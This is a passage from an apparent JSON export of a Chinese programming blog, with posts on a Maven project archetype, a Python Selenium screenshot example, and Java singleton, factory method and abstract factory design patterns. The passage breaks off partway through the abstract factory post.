class=\"string\">&quot;true&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/test/java<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.*<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">fileSet</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">fileSet</span> <span class=\"attr\">filtered</span>=<span class=\"string\">&quot;true&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/test/resources<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.*<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">fileSet</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">fileSets</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">archetype-descriptor</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>注意事项：<blockquote>\n<p>在archetype-resources文件夹java代码中，package和import不要直写当前路径，可以使用${package}，在生成项目后，会自动替换，以免代码生成项目后，路径出错。<br>在pom.xml 或者其他配置文件，或其他java代码中有路径的，比如说spring扫描路径，可以配置为${groupId}，在创建项目时填写的groupId会被替换。同理还有${groupId}，其他相关配置可参考maven官方文档。</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"使用方式\"><a href=\"#使用方式\" class=\"headerlink\" title=\"使用方式\"></a>使用方式</h4><ol>\n<li>使用命令 <em>mvn install</em> 把当前项目打包到本地maven仓库中，如果都要上传到服务器，可以配置好服务器路径，账号密码，使用 <em>mvn deploy</em> 上传文件。</li>\n<li>创建maven项目,如图<img src=\"/images/old/20170908QQ20170908-102803.png\">，配置archetype相关参数。后续步骤和普通创建maven项目一致。</li>\n<li>导入创建的maven项目，配置数据库，启动项目即可。</li>\n</ol>\n<p>该项目地址 ** <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3doaHh6L3F1aWNrLXNzbS13ZWJhcHA=\">quick-ssm-webapp<i class=\"fa fa-external-link-alt\"></i></span> **</p>\n","categories":["maven"],"tags":["maven","脚手架","快速搭建项目","archetypes"]},{"title":"Python selenium 初次使用","url":"/2017/09/12/Python-selenium-%E5%88%9D%E6%AC%A1%E4%BD%BF%E7%94%A8/","content":"<h3 id=\"使用前准备\"><a href=\"#使用前准备\" class=\"headerlink\" title=\"使用前准备\"></a>使用前准备</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install selenium</span><br></pre></td></tr></table></figure>\n<p>下载PhantomJS，ChromeDriver</p>\n<h3 id=\"使用selenium\"><a href=\"#使用selenium\" class=\"headerlink\" title=\"使用selenium\"></a>使用selenium</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 通过phantomjs使用，phantomjs是无界面浏览器</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">use_phantom</span>():</span><br><span class=\"line\">    <span class=\"comment\"># 设置代理</span></span><br><span class=\"line\">    service_args = [<span class=\"string\">&#x27;--proxy=proxy3.fn.com:8080&#x27;</span>, <span class=\"string\">&#x27;--proxy-type=http&#x27;</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 设置路径</span></span><br><span class=\"line\">    driver = webdriver.PhantomJS(executable_path=<span class=\"string\">&quot;/Users/demo/SOFT/phantomjs/phantomjs-2.1.1-macosx/bin/phantomjs&quot;</span>,</span><br><span class=\"line\">                                 service_args=service_args)</span><br><span class=\"line\">    driver.get(<span class=\"string\">&quot;https://www.google.com&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 截图</span></span><br><span class=\"line\">    driver.get_screenshot_as_file(<span class=\"string\">&quot;phantomjsGoogle.png&quot;</span>)</span><br><span class=\"line\">    driver.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用chrome浏览器</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">use_chrome</span>():</span><br><span class=\"line\">    <span class=\"comment\"># 获取chrome参数配置</span></span><br><span class=\"line\">    chrome_options = webdriver.ChromeOptions()</span><br><span class=\"line\">    <span class=\"comment\"># 使用代理</span></span><br><span class=\"line\">    chrome_options.add_argument(<span class=\"string\">&quot;--proxy-server=proxy3.fn.com:8080&quot;</span>)</span><br><span class=\"line\">    chrome_options.add_argument(<span class=\"string\">&quot;--proxy-type=http&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 设置路径</span></span><br><span class=\"line\">    driver = webdriver.Chrome(executable_path=<span class=\"string\">&quot;/Users/xuzhuo/SOFT/chromedriver/chromedriver&quot;</span>,</span><br><span class=\"line\">                              chrome_options=chrome_options)</span><br><span class=\"line\">    driver.get(<span class=\"string\">&quot;https://www.google.com&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 截图</span></span><br><span class=\"line\">    driver.get_screenshot_as_file(<span class=\"string\">&quot;chromeGoogle.png&quot;</span>)</span><br><span class=\"line\">    driver.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">use_phantom()</span><br><span class=\"line\">use_chrome()</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n","categories":["python","selenium"],"tags":["python","selenium"]},{"title":"Java设计模式-单例模式（Singleton Pattern）","url":"/2017/09/13/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F%EF%BC%88Singleton-Pattern%EF%BC%89/","content":"<h3 id=\"单例模式概念\"><a href=\"#单例模式概念\" class=\"headerlink\" title=\"单例模式概念\"></a>单例模式概念</h3><blockquote>\n<ul>\n<li>有且只有一个实例</li>\n<li>必须自行创建这个实例</li>\n<li>必须自行向整个系统提供这个实例</li>\n</ul>\n</blockquote>\n<h3 id=\"单例设计\"><a href=\"#单例设计\" class=\"headerlink\" title=\"单例设计\"></a>单例设计</h3><p>单例的创建一般分为 <strong>饿汉式单例</strong> 、 <strong>懒汉式单例</strong> 。</p>\n<h4 id=\"饿汉式单例\"><a href=\"#饿汉式单例\" class=\"headerlink\" title=\"饿汉式单例\"></a>饿汉式单例</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">EagerSingleton</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//自己创建的实例</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">EagerSingleton</span> <span class=\"variable\">singleton</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">EagerSingleton</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 私有构造函数，不允许外部创建</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"title function_\">EagerSingleton</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 对外提供当前实例</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> EagerSingleton <span class=\"title function_\">getInstance</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> singleton;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<p>当类被加载的时候，static会初始化，创建当前对象，因为构造函数是私有的，这样避免了外部创建改对象，通过静态方法提供了系统外部的访问。由java类加载器保证该类只会加载一次。采用的是空间换时间。<br>缺点：该类就是在系统中不使用也会初始化，对象会一直存在，不会被回收。占用系统资源。</p>\n<p>在jdk中有啥用饿汉式单例设计模式，如Runtime：<br><img src=\"/images/old/20170913%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-13%E4%B8%8B%E5%8D%883.02.15.png\"></p>\n<h4 id=\"懒汉式单例\"><a href=\"#懒汉式单例\" class=\"headerlink\" title=\"懒汉式单例\"></a>懒汉式单例</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 懒汉式单例</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"> <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">  * 懒汉式单例</span></span><br><span class=\"line\"><span class=\"comment\">  */</span></span><br><span class=\"line\"> <span class=\"keyword\">class</span> <span class=\"title class_\">LazySingleton</span> &#123;</span><br><span class=\"line\">   <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">    * 避免jdk做相关优化，导致代码重排序</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">   <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">static</span> <span class=\"type\">LazySingleton</span> <span class=\"variable\">singleton</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">      * 私有构造函数</span></span><br><span class=\"line\"><span class=\"comment\">      */</span></span><br><span class=\"line\">     <span class=\"keyword\">private</span> <span class=\"title function_\">LazySingleton</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">      * 创建获取单例对象</span></span><br><span class=\"line\"><span class=\"comment\">      * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">      */</span></span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> LazySingleton <span class=\"title function_\">getInstance</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">         <span class=\"comment\">//懒汉式改进，避免方法上锁导致效率变低</span></span><br><span class=\"line\">         <span class=\"keyword\">if</span> (singleton == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">             <span class=\"comment\">//双重检查锁，保证创建的时候只有一个线程参与</span></span><br><span class=\"line\">             <span class=\"keyword\">synchronized</span>(LazySingleton.class)&#123;</span><br><span class=\"line\">                 <span class=\"keyword\">if</span> (singleton == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                     singleton = <span class=\"keyword\">new</span> <span class=\"title class_\">LazySingleton</span>();</span><br><span class=\"line\">                 &#125;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">         <span class=\"keyword\">return</span> singleton;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>类被初始化的时候，不会创建对象。在第一次调用getInstance才会创建对象。第一次判断，判断是否单例已经存在。在创建改单例的时候，加锁后判断，是避免多线程访问的时候，保证只创建一个实例。<br>在java中java.util.Calendar使用的是懒汉式。<br>缺点：因为使用了volatile和判断，速度相对饿汉式要慢，懒汉式避免了未使用的时候占用系统资源。</p>\n<h4 id=\"Initialization-Demand-Holder-IoDH-单例\"><a href=\"#Initialization-Demand-Holder-IoDH-单例\" class=\"headerlink\" title=\"Initialization Demand Holder (IoDH) 单例\"></a>Initialization Demand Holder (IoDH) 单例</h4><p>饿汉式单例和懒汉式单例创建各有优缺点。使用IoDH可以避免二者缺点</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Singleton</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 私有构造函数</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"title function_\">Singleton</span><span class=\"params\">()</span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 静态内部类，用于创建单例</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">HolderClass</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"type\">Singleton</span> <span class=\"variable\">singleton</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Singleton</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 对外提供单例</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Singleton <span class=\"title function_\">getInstance</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> HolderClass.singleton;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在类被初始化的时候，静态内部类并不会被初始化，只有使用到静态内部类的时候，才会被初始化。因为是私有类，保证了外部无法访问，静态属性由java类加载器保证了该类只被初始化一次。同时没有锁没有判断，集合之前两种单例创建的优点。</p>\n<h4 id=\"枚举单例\"><a href=\"#枚举单例\" class=\"headerlink\" title=\"枚举单例\"></a>枚举单例</h4><p>之前三种单例创建有个缺点，在单例实现序列化后，在实例序列化反序列化后，会存在多个实现，违背了单例设计模式。例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Singleton</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">serialVersionUID</span> <span class=\"operator\">=</span> -<span class=\"number\">1218018069415776722L</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 私有构造函数</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"title function_\">Singleton</span><span class=\"params\">()</span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 静态内部类，用于创建单例</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">HolderClass</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"type\">Singleton</span> <span class=\"variable\">singleton</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Singleton</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 对外提供单例</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Singleton <span class=\"title function_\">getInstance</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> HolderClass.singleton;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"comment\">//创建单例</span></span><br><span class=\"line\">        <span class=\"type\">Singleton</span> <span class=\"variable\">instance</span> <span class=\"operator\">=</span> Singleton.getInstance();</span><br><span class=\"line\">        <span class=\"comment\">//创建输入输出管道</span></span><br><span class=\"line\">        <span class=\"type\">PipedOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PipedOutputStream</span>();</span><br><span class=\"line\">        <span class=\"type\">PipedInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PipedInputStream</span>();</span><br><span class=\"line\">        inputStream.connect(outputStream);</span><br><span class=\"line\">        <span class=\"comment\">//准备对象序列化</span></span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">objectOutputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(outputStream);</span><br><span class=\"line\">        objectOutputStream.writeObject(instance);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">objectInputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(inputStream);</span><br><span class=\"line\">        <span class=\"type\">Singleton</span> <span class=\"variable\">singleton</span> <span class=\"operator\">=</span> (Singleton) objectInputStream.readObject();</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">        inputStream.close();</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(singleton == instance);<span class=\"comment\">//false</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注：可以使用readResolve避免，但是需要自己处理</p>\n<p>在该例子中，序列化后的对象是一个新的实例。<br>解决办法使用枚举做单例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">enum</span> <span class=\"title class_\">EnumSingleton</span>&#123;</span><br><span class=\"line\">    SINGLETON;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doSomeThing</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;单例&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在《高效Java 第二版》中说：单元素的枚举类型已经成为实现Singleton的最佳方法。用枚举来实现单例非常简单，只需要编写一个包含单个元素的枚举类型即可。<br>枚举在序列化时候其实是序列化了name，在反序列化的时候，通过valueOf(name)，保证了枚举的唯一性。</p>\n<h3 id=\"单例模式总结\"><a href=\"#单例模式总结\" class=\"headerlink\" title=\"单例模式总结\"></a>单例模式总结</h3><p>单例因为控制实例的创建，在系统内存中只有唯一一份，可以节约系统资源，减少了对象的频繁创建和销毁。在Spring中默认创建的对象为单例，在Struts2中action默认创建的对象为多例。<br>单例缺点在于扩展比较困难，而且违背了“单一职责原则”，因为单例又是对象创建工厂，又是实例，还包含相关业务方法。<br>单例设计模式用在，系统因为消耗太大只允许创建一个对象情况。或者系统只能使用一个公共访问点，除了公共访问点，不能通过其他途径访问该实例。</p>\n","categories":["设计模式"],"tags":["设计模式","单例模式","Singleton Pattern"]},{"title":"Java设计模式-工厂方法模式（Factory Method Pattern）","url":"/2017/09/13/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F%EF%BC%88Factory-Method-Pattern%EF%BC%89/","content":"<h3 id=\"工厂方法模式\"><a href=\"#工厂方法模式\" class=\"headerlink\" title=\"工厂方法模式\"></a>工厂方法模式</h3><blockquote>\n<p>定义一个用于创建对象的接口，让子类决定将哪一个类实例化。工厂方法模式让一个类的实例化延迟到其子类。工厂方法模式提供一个抽象接口来声明抽象工厂方法，而由其子类来具体实现工厂方法，创建具体的产品对象。</p>\n</blockquote>\n<p>如图工厂方法：<br><img src=\"/images/old/20170913%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-13%E4%B8%8A%E5%8D%8810.14.46.png\"><span id=\"more\"></span></p>\n<ul>\n<li>Logger：抽象日志类</li>\n<li>FileLogger：文件日志</li>\n<li>ConsoleLogger：控制台日志</li>\n<li>LoggerFactory：工厂类接口</li>\n<li>FileLoggerFactory：具体的文件工厂类</li>\n<li>ConsoleLoggerFactory：具体的控制台日志工厂类</li>\n</ul>\n<p>Java代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">LoggerFactory</span> &#123;</span><br><span class=\"line\">    Logger <span class=\"title function_\">createLogger</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FileLoggerFactory</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">LoggerFactory</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Logger <span class=\"title function_\">createLogger</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">FileLogger</span> <span class=\"variable\">fileLogger</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileLogger</span>();</span><br><span class=\"line\">        <span class=\"comment\">//do other something</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;创建成功：&quot;</span> + fileLogger.getClass().getSimpleName());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> fileLogger;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConsoleLoggerFactory</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">LoggerFactory</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Logger <span class=\"title function_\">createLogger</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">ConsoleLogger</span> <span class=\"variable\">consoleLogger</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ConsoleLogger</span>();</span><br><span class=\"line\">        <span class=\"comment\">//do other something</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;创建成功：&quot;</span> + consoleLogger.getClass().getSimpleName());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> consoleLogger;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Logger</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">writeLog</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FileLogger</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Logger</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">writeLog</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;文件日志输出&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConsoleLogger</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Logger</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">writeLog</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;控制台日志输出&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Logger</span> <span class=\"variable\">fileLogger</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileLoggerFactory</span>().createLogger();</span><br><span class=\"line\">        <span class=\"type\">Logger</span> <span class=\"variable\">consoleLogger</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ConsoleLoggerFactory</span>().createLogger();</span><br><span class=\"line\">        fileLogger.writeLog();</span><br><span class=\"line\">        consoleLogger.writeLog();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"工厂模式优点\"><a href=\"#工厂模式优点\" class=\"headerlink\" title=\"工厂模式优点\"></a>工厂模式优点</h3><ol>\n<li>在工厂设计模式中，工厂方法用于创建所需要的对象。调用方不需要关心创建细节，只需要找到对应的工厂创建对应的对象。</li>\n<li>在需求变更时，需要新增一个产品。只需要新建相应的工厂类就可以，无需变动原有代码，使可扩展性变强，符合<strong>开闭原则</strong>。</li>\n<li>方便维护，对象一致性。在需要修改创建的对象，或者在创建对象前后有变更相关操作，可以直接修改Factory中创建对象的前后操作。如果每个地方都自己用new创建，修改地方太多，存在风险。</li>\n</ol>\n<h3 id=\"工厂模式缺点\"><a href=\"#工厂模式缺点\" class=\"headerlink\" title=\"工厂模式缺点\"></a>工厂模式缺点</h3><ol>\n<li>每次新增一个产品，都需要写个新的工厂类。</li>\n<li>考虑了可扩展性，引入了抽象层次，加大系统理解难度</li>\n</ol>\n<h3 id=\"工厂模式总结\"><a href=\"#工厂模式总结\" class=\"headerlink\" title=\"工厂模式总结\"></a>工厂模式总结</h3><p>在Spring中大量使用了工厂设计模式（可参考FacoryBean），由Spring这个大工厂创建用户所需要的对象，组装对象，用户需要时，由Spring工厂创建对象提供给用户使用。减少了用户自己操作出错概率，各个对象之间也可以解耦。<br>在JDK中还有</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">java.lang.Proxy#newProxyInstance()</span><br><span class=\"line\">java.lang.Class#newInstance()</span><br><span class=\"line\">java.lang.reflect.Constructor#newInstance()</span><br></pre></td></tr></table></figure>\n","categories":["设计模式"],"tags":["设计模式","工厂方法","Factory Method Pattern"]},{"title":"Java设计模式-抽象工厂模式（Abstract Factory Pattern）","url":"/2017/09/13/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%EF%BC%88Abstract-Factory-Pattern%EF%BC%89/","content":"<h3 id=\"抽象工厂概念\"><a href=\"#抽象工厂概念\" class=\"headerlink\" title=\"抽象工厂概念\"></a>抽象工厂概念</h3><blockquote>\n<p>抽象工厂相对工厂方法，可以创建一个产品族，而不是单一的产品。也就是在工厂方法上添加了创建其他产品方法。</p>\n</blockquote>\n<p>如图：<br><img src=\"/images/old/20170913%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-09-13%E4%B8%8B%E5%8D%882.17.10.png\"></p>\n<ul>\n<li>SeasonFactory：季节工厂</li>\n<li>SpringFactory：春天工厂</li>\n<li>SummerFactory：夏天工厂</li>\n<li>Clothes：衣服</li>\n<li>Coat:上衣</li>\n<li>Trousers：裤子<br>Java代码如下：<span id=\"more\"></span><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Clothes</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">coth</span><span 